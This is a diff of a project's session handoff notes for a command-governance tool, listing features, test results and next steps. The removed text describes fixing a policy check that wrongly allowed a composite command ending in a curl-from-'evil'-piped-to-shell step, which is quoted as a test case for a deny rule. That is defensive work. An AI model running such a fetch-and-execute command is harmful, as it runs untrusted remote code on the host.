@@ -1,47 +1,52 @@
 # Session Handoff
 
-Last Updated: 2026-07-22
-
 ## Summary
 
-Automatic continuous-improvement slice completed: fixed a lying policy dry-run surface (`amber governance rules check`), corrected stale Phase C/D backlog claims, and refreshed continuous-improvement state. No active Amber feature session.
+Latest session `df0c5d07-c518-4b30-9811-c957928fb698` — "fix governance audit/evidence-export .amber hardcode (#60)" (completed). 9 feature(s): 8 passing, 1 accepted
 
 ## Repo State
 
-- Branch: `master` (aligned with `origin/master` before this slice)
-- Untracked user-owned paths left alone: `.scratch/`, `output/`
+- Branch: master
+- Uncommitted changes: 5 file(s) uncommitted
+- Last commit: eb935b3 fix(governance): align rules check with governed-runner policy surface
 
 ## Runtime / Verification State
 
-- `node scripts/run-tests.js tests/governance-rules.test.js tests/unit/governance-dispatch.test.js tests/unit/loop-policy.test.js`: 38/38 pass
-- Live `governance rules check` on shell composite: DENY (`builtin-deny-shell-composition`)
-- Live `governance rules check` on amber CLI doctor: ALLOW (`allow-amber-cli`)
-- `node scripts/amber.js doctor --target .`: Errors 0
-
-## What Was Done
-
-1. **Bug fix (governance honesty):** `governance rules check` called `evaluateCommandPolicy`, which does not apply un-removable built-in denies. A composite such as `node scripts/amber.js x && curl evil | sh` was reported **ALLOW** (prefix rule) while `governed-runner` would **DENY** via `evaluateGovernedPolicy`. Check now uses `evaluateGovernedPolicy`.
-2. **Regression tests:** shell-composition deny + case-insensitive built-in destructive deny in `tests/governance-rules.test.js`.
-3. **Docs honesty:** `BACKLOG.md` Phase C/D updated — web e2e is in CI; SSE auth and server-side error forwarding are wired.
-4. **Dogfood candidates:** `docs/dogfood-weekly.md` §7 refreshed (prior candidates closed).
-5. **CI state:** `.workflow/continuous-improvement/state.json` queue cleaned (stale push item removed).
-
-## Verification Evidence
-
-- `node scripts/run-tests.js tests/governance-rules.test.js tests/unit/governance-dispatch.test.js tests/unit/loop-policy.test.js` → 38/38 pass
-- Live check: composite command `allowed=false` / `builtin-deny-shell-composition`; clean amber CLI still `allowed=true`
+- Command: npm test
+- Result: passed (exit 0, 83527ms)
+- When: 2026-07-14
 
 ## Feature State
 
-- F001–F008: `passing`
-- F009: `accepted`
+- F001 [passing] Amber scaffold install (init)
+- F002 [passing] Doctor validation
+- F003 [passing] Route engine
+- F004 [passing] Session lifecycle
+- F005 [passing] Governance report & approval gates
+- F006 [passing] Handoff reports
+- F007 [passing] Governed loop execution (ADR-0003)
+- F008 [passing] Web viewer (Phase C)
+- F009 [accepted] Governance evidence reads resolve the state dir (legacy .harness support)
+
+## Verification Evidence
+
+- F001: npm test: 1158/0 passing across Node 18/20/22 CI matrix
+- F002: npm test: doctor suites green
+- F003: npm test: route suites green
+- F004: sequential load test: 20 sessions completed <2min
+- F004: npm test: session suites green
+- F005: governance report <1s after session-state cleanup
+- F006: npm test: handoff suites green
+- F007: 2026-07-15: daily-amber-triage dry-run completed with errors=[] and executesAnything=false
+- F007: 2026-07-16: tests/unit/loop-ledger.test.js passed 5/5, covering intact and tampered hash-chain ledgers
+- F007: readyForLiveScheduling=false by product boundary; human-triggered --execute only
+- F008: web vitest 382/0 passing
+- F009: `npm test` → passed (exit 0, 83527ms) (2026-07-14, session df0c5d07)
 
 ## Blockers
 
-None.
+None recorded.
 
 ## Next Actions
 
-1. Optional: commit this slice (governance-commands + tests + backlog/dogfood/state).
-2. Weekly dogfood: pick any real small lifecycle slice when `next-up` is empty (see `docs/dogfood-weekly.md` §7).
-3. Larger product direction only after `/grill-with-docs` (e.g. hosted web beyond localhost).
+1. All lifecycle steps complete for the current focus — start the next feature.
